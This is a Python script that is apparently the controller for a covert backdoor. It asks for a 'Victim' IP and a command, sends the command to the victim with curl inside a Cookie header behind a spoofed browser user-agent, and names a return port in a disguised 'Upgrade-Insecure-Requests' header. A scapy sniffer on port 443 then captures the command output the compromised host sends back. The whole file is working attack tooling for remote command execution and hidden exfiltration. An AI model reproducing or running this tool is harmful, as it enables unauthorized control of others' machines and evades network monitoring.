#!/usr/bin/python3
from scapy.all import IP, TCP, Raw, sniff
import threading
from os import system, popen
from time import sleep
RETURN_PORT = 443

def get_IF_NAME():
    tokens = popen("ip route | grep default", 'r').read().split(" ")
    return tokens[tokens.index("dev")+1]

keep_sniffing = True
def process_packet(packet):
    global keep_sniffing
    if packet.haslayer(TCP) and packet[TCP].dport == RETURN_PORT:
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            output = payload.decode('utf-8').strip()
            print(output)
            keep_sniffing = False

def start_sniffing():
    sniff(iface=get_IF_NAME(), filter=f"tcp port {RETURN_PORT}", prn=process_packet, store=0)

def send_command(vic_ip, cmd):
    print(fr"curl {vic_ip} -A \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\" -H \"Cookie: ${cmd}\" -H \"Upgrade-Insecure-Requests: {RETURN_PORT}\" > /dev/null 2>&1")
    system(fr"curl {vic_ip} -A \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\" -H \"Cookie: ${cmd}\" -H \"Upgrade-Insecure-Requests: {RETURN_PORT}\" > /dev/null 2>&1")

def main():
    vic_ip = input("Victim: ")
    command = input("Command: ")

    # Start sniffing in a separate thread
    sniffing_thread = threading.Thread(target=start_sniffing, daemon=True)
    sniffing_thread.start()

    # Send the command to the victim IP
    send_command(vic_ip, command)

    # Wait until sniffing is complete
    while keep_sniffing:
        sleep(0.1)

if __name__ == "__main__":
    main()